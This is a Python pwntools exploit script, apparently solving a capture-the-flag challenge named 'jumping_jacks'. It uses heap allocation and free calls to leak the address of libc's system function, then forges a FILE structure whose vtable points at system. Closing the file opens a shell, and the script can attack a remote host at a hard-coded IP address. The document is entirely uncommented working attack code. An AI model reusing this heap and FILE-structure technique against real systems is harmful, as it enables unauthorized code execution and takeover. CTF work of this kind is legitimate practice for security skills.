from pwn import *
import sys

prompt = '>> '
name = 0x804a0c0
a, r, v, o, c, e = '1', '2', '3', '4', '5', '6'


def add(size, idx, payload):
    p.sendlineafter(prompt, a)
    p.sendlineafter('input\n', str(size))
    p.sendlineafter('index\n', str(idx))
    if size > len(payload):
        payload += '\n'
    p.sendafter('Content\n', payload)


def remove(idx):
    p.sendlineafter(prompt, r)
    p.sendlineafter('index\n', str(idx))


def view(idx, n):
    p.sendlineafter(prompt, v)
    p.sendlineafter('index\n', str(idx))
    return p.recvlines(n)


def openfile():
    p.sendlineafter(prompt, o)


def closefile():
    p.sendlineafter(prompt, c)


def edit(payload):
    p.sendlineafter(prompt, e)
    if len(payload) < 64:
        payload += '\n'
    p.send(payload)


if __name__ == '__main__':
    if len(sys.argv)>1:
	p=remote("35.196.20.16",8181)		
    else:
    	p = process('./jumping_jacks')
    add(0x80, 0, 'asdf')
    add(0x80, 1, 'blah')
    remove(0)
    add(0x80, 0, 'A'*3)
    system = u32(view(0, 2)[1]) - 0x177a10
    log.success("Leaked system @ {}".format(hex(system)))
    junk = ''.ljust(0xe8, 'A')
    payload = fit({0: p32(0xfbad2488)+';sh\x00',
                  0x48: p32(name)+p32(name-0x20)})
    add(0x1d0, 2, junk+payload)
    openfile()
    edit(p32(0)+p32(system)*15)
    closefile()
    p.interactive()
